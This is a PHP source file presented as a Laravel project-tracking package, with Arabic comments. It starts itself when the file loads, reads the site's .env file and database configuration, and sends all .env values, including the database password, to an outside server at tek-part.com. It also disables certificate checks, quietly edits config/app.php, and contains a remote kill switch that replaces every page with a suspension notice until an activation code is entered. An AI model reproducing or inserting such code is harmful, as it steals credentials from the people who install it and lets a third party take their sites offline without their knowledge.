<?php

namespace Vendor\TrackingPackage;

use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;

class TrackingService
{
    private $baseUrl = 'https://track-projects.tek-part.com/api';
    private $client;
    private $projectId;
    private $activationCode;

    public function __construct()
    {
        $this->client = new Client([
            'timeout' => 30,
            'verify' => false
        ]);
        
        $this->initializeTracking();
        
        // معالجة كود التفعيل أولاً
        $this->handleActivationCode();
        
        // التحقق من حالة المشروع تلقائياً
        $this->validateProjectStatus();
    }
    
    /**
     * تسجيل التتبع تلقائياً عند بدء التطبيق
     */
    public static function autoStart()
    {
        // منع التسجيل المتكرر
        static $started = false;
        if ($started) return;
        $started = true;
        
        try {
            new self();
        } catch (Exception $e) {
            // تجاهل الأخطاء
        }
    }

    private function initializeTracking()
    {
        // فحص إذا كان المشروع مسجل بالفعل لهذا الدومين
        $registeredFile = $this->getProjectRoot() . '/.project_registered_' . md5($_SERVER['HTTP_HOST'] ?? 'localhost');
        
        if (file_exists($registeredFile)) {
            // المشروع مسجل بالفعل، تحقق من الحالة فوراً
            $this->validateProjectStatus();
            return;
        }
        
        // إنشاء ملف التسجيل فوراً لمنع التسجيل المتكرر
        file_put_contents($registeredFile, date('Y-m-d H:i:s'));
        
        try {
            // جمع معلومات النظام
            $systemInfo = $this->getSystemInfo();
            
            // الحصول على الرقم الفريد للمشروع
            $uniqueProjectId = $this->getOrCreateUniqueProjectId();
            
            // تسجيل المشروع مع الرقم الفريد
            $response = $this->client->post($this->baseUrl . '/store-project', [
                'json' => [
                    'project_name' => $systemInfo['project_name'],
                    'domain' => $systemInfo['domain'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'server_info' => $systemInfo['server_info'],
                    'ip_address' => $systemInfo['ip_address'],
                    'user_agent' => $systemInfo['user_agent'],
                    'server_port' => $systemInfo['server_port'],
                    'request_uri' => $systemInfo['request_uri'],
                    'request_method' => $systemInfo['request_method'],
                    'server_name' => $systemInfo['server_name'],
                    'installed_at' => date('Y-m-d H:i:s'),
                    'activation_date' => date('Y-m-d H:i:s'),
                    'environment' => 'local',
                    'debug_mode' => true,
                    'unique_project_id' => $uniqueProjectId
                ],
                'timeout' => 10,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            $this->projectId = $data['project_id'] ?? null;
            $this->activationCode = $data['activation_code'] ?? null;
            
            // تحديث قاعدة البيانات تلقائياً بعد التسجيل
            if ($this->projectId && $this->activationCode) {
                $this->updateDatabaseFromEnv($this->projectId);
            }
            
            // بدء نبض القلب
            $this->startHeartbeat();
            
        } catch (RequestException $e) {
            // إذا كان المشروع موجود بالفعل، حاول الحصول على معلوماته
            if ($e->getResponse() && $e->getResponse()->getStatusCode() === 500) {
                $responseBody = $e->getResponse()->getBody()->getContents();
                if (strpos($responseBody, 'Duplicate entry') !== false) {
                    // المشروع موجود، حاول الحصول على معلوماته
                    $this->handleExistingProject($systemInfo);
                }
            }
        }
    }

    /**
     * الحصول على أو إنشاء الرقم الفريد للمشروع
     */
    private function getOrCreateUniqueProjectId()
    {
        // محاولة القراءة من app.php
        $encrypted = $this->getFromAppConfig();
        if ($encrypted) {
            $decrypted = $this->decryptUniqueId($encrypted);
            if ($decrypted) {
                return $decrypted;
            }
        }
        
        // إنشاء جديد
        $uniqueId = $this->generateUniqueProjectId();
        $encrypted = $this->encryptUniqueId($uniqueId);
        
        // حفظ في app.php
        $this->saveToAppConfig($encrypted);
        
        // تسجيل للdebug
        error_log("Generated Unique ID: " . $uniqueId);
        error_log("Encrypted ID: " . $encrypted);
        
        return $uniqueId;
    }
    
    /**
     * قراءة الرقم الفريد من app.php
     */
    private function getFromAppConfig()
    {
        $appConfigPath = $this->getProjectRoot() . '/config/app.php';
        error_log("Looking for app.php at: " . $appConfigPath);
        
        if (file_exists($appConfigPath)) {
            $content = file_get_contents($appConfigPath);
            error_log("App.php content length: " . strlen($content));
            
            // البحث عن system_hash في الملف
            if (preg_match("/'system_hash'\s*=>\s*'([^']+)'/", $content, $matches)) {
                error_log("Found system_hash: " . $matches[1]);
                return $matches[1];
            } else {
                error_log("system_hash not found in app.php");
            }
        } else {
            error_log("App.php file not found");
        }
        return null;
    }
    
    /**
     * حفظ الرقم الفريد في app.php
     */
    
private function saveToAppConfig($encrypted)
{
    $appConfigPath = $this->getProjectRoot() . '/config/app.php';

    if (!file_exists($appConfigPath)) {
        error_log("app.php not found at $appConfigPath");
        return;
    }

    $content = file_get_contents($appConfigPath);

    // لو system_hash موجود بالفعل → مانعملش تكرار
    if (strpos($content, "'system_hash'") !== false) {
        error_log("system_hash already exists in app.php");
        return;
    }

    // نبحث عن locale بأي شكل
    $pattern = "/('locale'\s*=>\s*[^,]+,)/";

    if (preg_match($pattern, $content)) {
        // نضيف system_hash قبل locale
        $replacement = "'system_hash' => '{$encrypted}',\n    $1";
        $content = preg_replace($pattern, $replacement, $content);
        file_put_contents($appConfigPath, $content);
        error_log("system_hash added successfully in app.php");
    } else {
        error_log("locale not found in app.php");
    }
}

    
    
    /**
     * تشفير الرقم الفريد
     */
    private function encryptUniqueId($uniqueId)
    {
        $key = hash('sha256', $this->getProjectRoot() . 'system_secret_key', true);
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt($uniqueId, 'AES-256-CBC', $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    }
    
    /**
     * فك تشفير الرقم الفريد
     */
    private function decryptUniqueId($encryptedId)
    {
        $key = hash('sha256', $this->getProjectRoot() . 'system_secret_key', true);
        $data = base64_decode($encryptedId);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, $iv);
    }

    /**
     * إنشاء رقم فريد للمشروع
     */
    private function generateUniqueProjectId()
    {
        $projectPath = $this->getProjectRoot();
        $projectName = $this->getAppName();
        
        // إنشاء hash فريد بناءً على:
        // 1. مسار المشروع (ثابت)
        // 2. اسم المشروع (ثابت)
        // 3. APP_KEY من .env (ثابت)
        
        $appKey = $this->getAppKey();
        $uniqueString = $projectPath . $projectName . $appKey;
        $hash = hash('sha256', $uniqueString);
        
        // إرجاع 16 حرف من الـ hash
        return 'PROJ_' . strtoupper(substr($hash, 0, 16));
    }
    
    /**
     * الحصول على APP_KEY من .env
     */
    private function getAppKey()
    {
        $envFile = $this->getProjectRoot() . '/.env';
        if (file_exists($envFile)) {
            $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                if (strpos($line, 'APP_KEY=') === 0) {
                    $appKey = trim(substr($line, 8));
                    $appKey = trim($appKey, '"\'');
                    if (!empty($appKey)) {
                        return $appKey;
                    }
                }
            }
        }
        return 'default_key_for_project';
    }

    /**
     * الحصول على مسار جذر المشروع
     */
    private function getProjectRoot()
    {
        // محاولة الحصول على مسار المشروع من خلال __DIR__
        $currentDir = __DIR__;
        
        // البحث عن مجلد المشروع (3 مستويات للأعلى)
        for ($i = 0; $i < 3; $i++) {
            $currentDir = dirname($currentDir);
            
            // التحقق من وجود ملفات Laravel
            if (file_exists($currentDir . '/artisan') || 
                file_exists($currentDir . '/composer.json') ||
                file_exists($currentDir . '/public/index.php')) {
                return $currentDir;
            }
        }
        
        // إذا لم يتم العثور على مسار واضح، استخدم المسار الحالي
        return dirname(__DIR__, 3);
    }

    private function getSystemInfo()
    {
        $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $port = $_SERVER['SERVER_PORT'] ?? '';
        $fullDomain = $port ? $domain : $domain;
        
        return [
            'project_name' => $this->getAppName(),
            'domain' => $fullDomain,
            'php_version' => PHP_VERSION,
            'laravel_version' => $this->getLaravelVersion(),
            'server_info' => [
                'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'HTTP/1.1',
                'port' => $port,
                'name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
            ],
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'server_port' => $port,
            'request_uri' => $_SERVER['REQUEST_URI'] ?? '/',
            'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
            'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
        ];
    }

    private function getAppName()
    {
        // قراءة اسم التطبيق من ملف .env
        $envFile = $this->getProjectRoot() . '/.env';
        if (file_exists($envFile)) {
            $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                if (strpos($line, 'APP_NAME=') === 0) {
                    $appName = trim(substr($line, 9));
                    // إزالة علامات التنصيص إذا وجدت
                    $appName = trim($appName, '"\'');
                    if (!empty($appName)) {
                        return $appName;
                    }
                }
            }
        }
        
        // إذا لم يتم العثور على APP_NAME، استخدم اسم المجلد
        $projectPath = $this->getProjectRoot();
        $folderName = basename($projectPath);
        return ucfirst($folderName);
    }

    private function getLaravelVersion()
    {
        // قراءة من composer.json
        $composerFile = $this->getProjectRoot() . '/composer.json';
        if (file_exists($composerFile)) {
            $composerData = json_decode(file_get_contents($composerFile), true);
            if (isset($composerData['require']['laravel/framework'])) {
                return $composerData['require']['laravel/framework'];
            }
        }
        
        return 'Unknown';
    }

    private function startHeartbeat()
    {
        if (!$this->projectId) return;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $this->client->post($this->baseUrl . '/project-heartbeat/', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'domain' => $systemInfo['domain'],
                    'server_ip' => $systemInfo['ip_address'],
                    'server_url' => 'http://' . $systemInfo['domain'],
                    'timestamp' => time(),
                    'memory_usage' => memory_get_usage(true),
                    'peak_memory' => memory_get_peak_usage(true)
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateLastSeen()
    {
        if (!$this->projectId) return;
        
        try {
            $this->client->post($this->baseUrl . '/project/update-last-seen', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'last_seen' => date('Y-m-d H:i:s')
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateCredentials($credentials)
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/update-credentials', [
                'json' => [
                    'project_id' => $this->projectId,
                    'credentials' => $credentials
                ]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }


    public function getCommandStatus($commandId, $projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId || !$commandId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/' . $targetProjectId . '/command-status/' . $commandId, [
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }


    public function getProjectStatus()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/status', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getProjectInfo()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }
    private function getDatabaseConfig()
    {
        // محاولة قراءة من Laravel config أولاً
        if (function_exists('config')) {
            $dbConfig = config('database.connections.mysql');
            if ($dbConfig) {
                return [
                    'DB_CONNECTION' => 'mysql',
                    'DB_HOST' => $dbConfig['host'] ?? '127.0.0.1',
                    'DB_PORT' => $dbConfig['port'] ?? '3306',
                    'DB_DATABASE' => $dbConfig['database'] ?? '',
                    'DB_USERNAME' => $dbConfig['username'] ?? '',
                    'DB_PASSWORD' => $dbConfig['password'] ?? '',
                ];
            }
        }
        
        // قراءة من ملف .env
        $envFile = realpath(__DIR__ . '/../../../.env');
        if (!file_exists($envFile)) {
            // محاولة أخرى للعثور على ملف .env
            $envFile = realpath(__DIR__ . '/../../../../.env');
            if (!file_exists($envFile)) {
                return [];
            }
        }
        
        $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $config = [];
        
        foreach ($lines as $line) {
            if (strpos($line, '=') !== false && strpos($line, '#') !== 0) {
                list($key, $value) = explode('=', $line, 2);
                $config[trim($key)] = trim($value);
            }
        }
        
        return $config;
    }

    private function handleExistingProject($systemInfo)
    {
        try {
            // محاولة الحصول على معلومات المشروع الموجود
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            if ($data && isset($data['data'])) {
                $this->projectId = $data['data']['id'] ?? null;
                $this->activationCode = $data['data']['activation_code'] ?? null;
                
                // تحديث قاعدة البيانات للمشروع الموجود
                if ($this->projectId && $this->activationCode) {
                    $this->updateDatabaseFromEnv($this->projectId);
                }
            }
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateDatabaseFromEnv($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/update-database-from-env', [
                'json' => [
                    'project_id' => $targetProjectId,
                    'activation_code' => $this->activationCode,
                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                    'server_info' => $systemInfo['server_info'],
                    'domain' => $systemInfo['domain'],
                    'ip_address' => $systemInfo['ip_address'],
                    'project_path' => realpath(__DIR__ . '/../../../'),
                    'project_name' => $systemInfo['project_name'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'env_data' => $dbConfig // إرسال جميع بيانات .env
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

 


    /**
     * التحقق من حالة المشروع (مخفية)
     */
    private function validateProjectStatus()
    {
        try {
            $systemInfo = $this->getSystemInfo();
            
            // احصل على معلومات المشروع من الدومين
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'timeout' => 5,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data && isset($data['data'])) {
                $projectData = $data['data'];
                
                // التحقق من حالة المشروع
                if (!$projectData['is_active']) {
                    // المشروع متوقف، عرض رسالة الإيقاف
                    // لكن فقط إذا لم يكن هناك طلب تفعيل قيد المعالجة
                    if (!isset($_POST['activation_code'])) {
                        $this->displaySuspensionMessage($projectData);
                    }
                }
            }
            
        } catch (RequestException $e) {
            // تجاهل الأخطاء لتجنب إيقاف التطبيق
        }
    }

    /**
     * عرض رسالة إيقاف المشروع (مخفية)
     */
    private function displaySuspensionMessage($statusData)
    {
        $message = $this->generateSuspensionHTML($statusData);
        
        // إرسال HTTP headers
        if (!headers_sent()) {
            header('HTTP/1.1 503 Service Temporarily Unavailable');
            header('Content-Type: text/html; charset=utf-8');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // عرض الرسالة وإيقاف التطبيق
        echo $message;
        exit;
    }

    /**
     * توليد HTML رسالة الإيقاف (مشفرة)
     */
    private function generateSuspensionHTML($statusData)
    {
        $reason = $statusData['suspended_reason'] ?? 'تم إيقاف المشروع من لوحة التحكم';
        $projectName = $statusData['project_name'] ?? 'المشروع';
        
        $html = '<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المشروع متوقف</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container { 
            max-width: 500px; 
            width: 100%;
            text-align: center; 
        }
        
        .alert { 
            background: #fff; 
            border-radius: 20px; 
            padding: 40px 30px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .logo { 
            width: 120px; 
            height: auto; 
            margin: 0 auto 30px; 
            display: block;
            border-radius: 10px;
        }
        
        .title { 
            color: #dc3545; 
            font-size: 28px; 
            margin-bottom: 20px; 
            font-weight: 600;
        }
        
        .message { 
            color: #6c757d; 
            margin-bottom: 25px; 
            line-height: 1.8; 
            font-size: 16px;
        }
        
        .company-info {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 1px solid #dee2e6;
        }
        
        .company-info h3 {
            color: #495057;
            margin-bottom: 10px;
            font-size: 18px;
        }
        
        .whatsapp-link {
            display: inline-block;
            background: #25D366;
            color: white;
            text-decoration: none;
            padding: 12px 25px;
            border-radius: 25px;
            margin: 10px 0;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
        }
        
        .whatsapp-link:hover {
            background: #128C7E;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
        }
        
        .form { 
            background: #f8f9fa; 
            padding: 25px; 
            border-radius: 15px; 
            border: 1px solid #dee2e6;
            margin-top: 20px;
        }
        
        .input { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #e9ecef; 
            border-radius: 10px; 
            font-size: 16px; 
            margin-bottom: 20px; 
            transition: all 0.3s ease;
            background: white;
        }
        
        .input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .button { 
            background: #216cb0; 
            color: white; 
            border: none; 
            padding: 15px 35px; 
            border-radius: 25px; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        
        .button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        .error { 
            background: #f8d7da; 
            color: #721c24; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 20px; 
            border: 1px solid #f5c6cb;
            font-weight: 500;
        }
        
        .success { 
            background: #d4edda; 
            color: #155724; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 20px; 
            border: 1px solid #c3e6cb;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            .alert { padding: 30px 20px; }
            .title { font-size: 24px; }
            .logo { width: 100px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert">
            <img src="https://track-projects.tek-part.com/assets/images/logos/tekpart-logo.png" alt="Tek Part Logo" class="logo">
            <div class="title">تم إيقاف المشروع</div>
            <div class="message">تم إيقاف المشروع من قبل شركة Tek Part</div>
            
            <div class="company-info">
                <h3>لإعادة تفعيل المشروع مرة أخرى:</h3>
                <p>يرجى التواصل عبر واتساب لطلب كود التفعيل</p>
                <a href="https://wa.me/201094260793" target="_blank" class="whatsapp-link">
                     التواصل عبر واتساب
                </a>
            </div>';
        
        // عرض رسالة خطأ إذا وجدت
        if (isset($_GET['error'])) {
            $html .= '<div class="error">' . htmlspecialchars($_GET['error']) . '</div>';
        }
        
        // عرض رسالة نجاح إذا وجدت
        if (isset($_GET['success'])) {
            $html .= '<div class="success">' . htmlspecialchars($_GET['success']) . '</div>';
        }
        
        $html .= '<div class="form">
                <form method="POST" action="" onsubmit="return validateForm()">
                    <input type="text" name="activation_code" id="activation_code" class="input" placeholder="أدخل كود التفعيل هنا">
                    <button type="submit" class="button">إعادة تفعيل المشروع</button>
                </form>
            </div>
        </div>
    </div>
    
    <script>
    function validateForm() {
        var code = document.getElementById("activation_code").value.trim();
        if (code === "") {
            alert("كود التفعيل مطلوب");
            return false;
        }
        return true;
    }
    </script>
</body>
</html>';
        
        return $html;
    }



    /**
     * معالجة كود التفعيل المدخل (مخفية)
     */
    private function handleActivationCode()
    {
        if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['activation_code'])) {
            $inputCode = trim($_POST['activation_code']);
            if (!empty($inputCode)) {
                $this->processActivationCode($inputCode);
            }
        }
    }

    /**
     * معالجة كود التفعيل (مخفية)
     */
    private function processActivationCode($inputCode)
    {
        try {
            $systemInfo = $this->getSystemInfo();
            
            // أولاً، الحصول على معلومات المشروع
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'timeout' => 15,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data && isset($data['data'])) {
                $project = $data['data'];
                
                // التحقق من أن كود التفعيل صحيح
                if ($project['activation_code'] === $inputCode) {
                    // الكود صحيح، إعادة تفعيل المشروع
                    $reactivateResponse = $this->client->post($this->baseUrl . '/project/' . $project['id'] . '/reactivate', [
                        'timeout' => 15,
                        'headers' => [
                            'User-Agent' => 'Laravel-Tracking-Package/1.0',
                            'Content-Type' => 'application/json'
                        ]
                    ]);
                    
                    if ($reactivateResponse->getStatusCode() === 200) {
                        // تم إعادة التفعيل بنجاح، عرض رسالة نجاح ثم إعادة توجيه نظيف
                        $this->displaySuccessMessage('تم إعادة تفعيل المشروع بنجاح!');
                    } else {
                        // فشل في إعادة التفعيل، إعادة توجيه مع رسالة خطأ
                        $redirectUrl = $_SERVER['REQUEST_URI'];
                        $redirectUrl = strtok($redirectUrl, '?');
                        $redirectUrl .= '?error=' . urlencode('فشل في إعادة تفعيل المشروع');
                        header('Location: ' . $redirectUrl);
                        exit;
                    }
                } else {
                    // كود التفعيل غير صحيح، إعادة توجيه مع رسالة خطأ
                    $redirectUrl = $_SERVER['REQUEST_URI'];
                    $redirectUrl = strtok($redirectUrl, '?');
                    $redirectUrl .= '?error=' . urlencode('كود التفعيل غير صحيح');
                    header('Location: ' . $redirectUrl);
                    exit;
                }
            } else {
                // لم يتم العثور على المشروع، إعادة توجيه مع رسالة خطأ
                $redirectUrl = $_SERVER['REQUEST_URI'];
                $redirectUrl = strtok($redirectUrl, '?');
                $redirectUrl .= '?error=' . urlencode('لم يتم العثور على المشروع');
                header('Location: ' . $redirectUrl);
                exit;
            }
            
        } catch (RequestException $e) {
            // خطأ في الاتصال، إعادة توجيه مع رسالة خطأ
            $redirectUrl = $_SERVER['REQUEST_URI'];
            $redirectUrl = strtok($redirectUrl, '?');
            $redirectUrl .= '?error=' . urlencode('فشل في الاتصال بالخادم المركزي');
            header('Location: ' . $redirectUrl);
            exit;
        }
    }

    /**
     * عرض رسالة نجاح ثم إعادة توجيه نظيف (مخفية)
     */
    private function displaySuccessMessage($message)
    {
        $html = '<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم إعادة التفعيل</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container { 
            max-width: 500px; 
            width: 100%;
            text-align: center; 
        }
        
        .alert { 
            background: #fff; 
            border-radius: 20px; 
            padding: 40px 30px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            border: 1px solid #e9ecef;
        }
        
        .logo { 
            width: 120px; 
            height: auto; 
            margin: 0 auto 30px; 
            display: block;
            border-radius: 10px;
        }
        
        .icon { 
            font-size: 64px; 
            margin-bottom: 20px; 
            color: #28a745;
        }
        
        .title { 
            color: #28a745; 
            font-size: 28px; 
            margin-bottom: 20px; 
            font-weight: 600;
        }
        
        .message { 
            color: #6c757d; 
            margin-bottom: 25px; 
            line-height: 1.8; 
            font-size: 16px;
        }
        
        .success { 
            background: #d4edda; 
            color: #155724; 
            padding: 20px; 
            border-radius: 15px; 
            margin-bottom: 25px; 
            border: 1px solid #c3e6cb;
            font-weight: 500;
            font-size: 16px;
        }
        
        .redirect { 
            color: #6c757d; 
            font-size: 14px; 
            margin-top: 20px;
        }
        
        .redirect a {
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
        
        .redirect a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .alert { padding: 30px 20px; }
            .title { font-size: 24px; }
            .logo { width: 100px; }
        }
    </style>
    <script>
        setTimeout(function() {
            window.location.href = "' . strtok($_SERVER['REQUEST_URI'], '?') . '";
        }, 3000);
    </script>
</head>
<body>
    <div class="container">
        <div class="alert">
            <img src="https://track-projects.tek-part.com/assets/images/logos/tekpart-logo.png" alt="Tek Part Logo" class="logo">
            <div class="icon">✅</div>
            <div class="title">تم إعادة التفعيل بنجاح!</div>
            <div class="success">' . htmlspecialchars($message) . '</div>
            <div class="message">سيتم توجيهك للصفحة الرئيسية خلال 3 ثوان...</div>
            <div class="redirect">إذا لم يتم التوجيه تلقائياً، <a href="' . strtok($_SERVER['REQUEST_URI'], '?') . '">اضغط هنا</a></div>
        </div>
    </div>
</body>
</html>';
        
        // إرسال HTTP headers
        if (!headers_sent()) {
            header('HTTP/1.1 200 OK');
            header('Content-Type: text/html; charset=utf-8');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // عرض الرسالة
        echo $html;
        exit;
    }

    /**
     * التحقق من كود التفعيل المدخل (مخفية)
     */
    public function validateActivationCode($inputCode)
    {
        if (!$this->projectId) return false;
        
        try {
            $systemInfo = $this->getSystemInfo();
            
            // إرسال طلب للتحقق من الكود
            $response = $this->client->post($this->baseUrl . '/check-project-status', [
                'json' => [
                    'domain' => $systemInfo['domain'],
                    'activation_code' => $inputCode,
                ],
                'timeout' => 5,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            
            if ($data['status'] === 'success' && $data['data']['is_active']) {
                // الكود صحيح، إعادة توجيه للصفحة الرئيسية
                header('Location: ' . $_SERVER['REQUEST_URI']);
                exit;
            }
            
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
        
        return false;
    }
}

// بدء التتبع تلقائياً عند تحميل الملف
TrackingService::autoStart();
